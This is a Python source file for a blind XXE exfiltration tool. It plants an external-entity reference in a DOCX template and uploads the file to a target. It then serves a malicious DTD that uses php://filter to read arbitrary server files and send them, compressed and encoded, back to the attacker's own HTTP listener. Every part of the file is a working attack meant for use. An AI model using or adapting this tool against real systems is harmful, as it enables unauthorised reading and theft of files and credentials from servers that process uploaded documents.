#!/usr/bin/env python3

import argparse
import sys
import http.server
import socketserver
import tempfile
import shutil
import pathlib
import random
import string
import urllib.parse
import threading
import base64
import bz2
import shlex
import time

#PPATH = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
PPATH = "X8SI4JA6XR"
LFI_PATH = ''

class InterceptorHttp(http.server.SimpleHTTPRequestHandler):
    LS_EVIL_XML = """<!ENTITY % file SYSTEM "php://filter/bzip2.compress/convert.base64-encode/resource={}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{}:{}/{}/handle?%file;'>">
"""
    HTTP_EVIL_XML = """<!ENTITY % file SYSTEM "{}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{}:{}/{}/handle?%file;'>">
"""

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if LFI_PATH is not None and len(LFI_PATH) > 0:
            cmd = shlex.split(LFI_PATH)
            EVIL_XML = None
            if cmd[0] == "cat":
                EVIL_XML = self.__class__.LS_EVIL_XML.format(cmd[1], self.server.server_address[0], self.server.server_port, PPATH)
            elif cmd[0] == "http":
                EVIL_XML = self.__class__.HTTP_EVIL_XML.format(cmd[1], self.server.server_address[0], self.server.server_port, PPATH)

            if EVIL_XML == None:
                print("Unknown command: '{}'".format(cmd[0]))
                return

            if self.path == "/":
                pass
            elif self.path == "/{}/evil.xml".format(PPATH):
                self.send_response(200)
                self.send_header('Content-Type', 'text/xml')
                self.end_headers()
                self.wfile.write(EVIL_XML.encode())
            elif self.path.startswith("/{}/handle".format(PPATH)):
                self.send_response(200)
                self.end_headers()
                try:
                    print(bz2.decompress(base64.b64decode(self.path.split('?')[1])).decode('utf-8'))
                except:
                    import traceback
                    traceback.print_exc()
                    print(self.path)
                self.wfile.write("".encode())
            else:
                print('Request: "{}" not treated'.format(self.path))
        else:
            print("LFI_PATH not set")
    
def infect_docx(temp_dir, url, template):
    import zipfile
    import os

    assert template.suffix == '.docx', "template provided is not a docx"
    zipdir = pathlib.PurePath(temp_dir, template.stem)
    os.mkdir(zipdir)
    ppath = os.getcwd()
    with zipfile.ZipFile(template, 'r') as tzf:
        os.chdir(zipdir)
        tzf.extractall()
        with open('word/document.xml', 'rb') as f:
            data = f.read().decode('utf-8')
        with open('word/document.xml', 'wb') as f:
            f.write(data.replace('THISISASUPERNOTVERYEFFICIENTWAYOFDOINGTHIS', urllib.parse.urljoin(url, '/{}/evil.xml'.format(PPATH))).encode('utf-8'))
        with zipfile.ZipFile('../{}.docx'.format(template.stem), 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            for fname in tzf.namelist():
                zf.write(fname)
    os.chdir(ppath)

    return pathlib.PurePath(temp_dir, "{}.docx".format(template.stem))

def post_docx(docx_path, url, data, headers):
    import requests

    kwargs = {
        'url': url,
        'data': dict(map(lambda x: (x[0], x[1][0]), urllib.parse.parse_qs(data).items())),
        'files': {'text': ("{}.docx".format(docx_path.stem), open(docx_path, 'rb'), 'application/wps-office.docx')},
    }
    if headers is not None:
        kwargs['headers'] = dict(map(lambda x: (x.split(':')[0], (':'.join(x.split(':')[1:])).strip()), headers))
    r = requests.post(**kwargs)


def run_server(listen, port):
    print("[+] Listening on: http://{}:{}/".format(listen, port))
    print("[+] Payload: http://{}:{}/{}/evil.xml".format(listen, port, PPATH))
    print("[+] Handler: http://{}:{}/{}".format(listen, port, PPATH))
    with http.server.ThreadingHTTPServer((listen, port), InterceptorHttp) as httpd:
        httpd.serve_forever()

def set_next_cmd(paths_file):
    global LFI_PATH
    LFI_PATH = ''
    if paths_file is not None:
        LFI_PATH = paths_file.readline()
        if len(LFI_PATH.strip()) > 0:
            LFI_PATH = "cat {}".format(LFI_PATH.decode("utf-8").strip())
            print(LFI_PATH)
    if len(LFI_PATH) == 0:
        LFI_PATH = input("$> ")

def main(args):
    global LFI_PATH
    from threading import Thread

    parser = argparse.ArgumentParser(description='Auto blind XXE exfil')
    parser.add_argument('-u', '--url', required=True, type=str, help='URL to post the payload to')
    parser.add_argument('-p', '--port', required=True, type=int, help='Listening port for HTTP server')
    parser.add_argument('-l', '--listen', required=True, type=str, help='Ip for HTTP server listen')
    parser.add_argument('-t', '--template', type=str, help='Docx template')
    parser.add_argument('-f', '--file', type=str, help='Docx file')
    parser.add_argument('-X', '--header', nargs='*', required=False)
    parser.add_argument('-D', '--data', type=str, required=False)
    parser.add_argument('-P', '--path', type=str, help='path to extract')
    parser.add_argument('--paths-file', type=str, help='pathes to extract')

    args = parser.parse_args(args[1:])

    url = "http://{}:{}".format(args.listen, args.port)
    LFI_PATH = args.path
    with tempfile.TemporaryDirectory() as tmpdirname:
        tmpdirname = "/tmp/tototototot"
        if args.template is not None:
            print("Infecting {}".format(args.template))
            docx_path = infect_docx(tmpdirname, url, pathlib.PurePath(args.template))
        else:
            docx_path = pathlib.PurePath(args.file)
        try:
            st = Thread(target=run_server, args=[args.listen, args.port])
            st.start()
            pt = None
            if LFI_PATH is not None:
                pt = Thread(target=post_docx, args=[docx_path, args.url, args.data, args.header])
                pt.start()
            f = None if args.paths_file is None else open(args.paths_file, 'rb')
            c = True
            while c is True:
                if pt is not None:
                    pt.join()
                if f is not None:
                    time.sleep(0.3)
                set_next_cmd(f)
                pt = Thread(target=post_docx, args=[docx_path, args.url, args.data, args.header])
                pt.start()
            st.join()
        except KeyboardInterrupt:
            print("Interrupted via CTRL+C")
        except:
            raise
        finally:
            if f is not None:
                f.close()

if __name__ == "__main__":
    main(sys.argv)
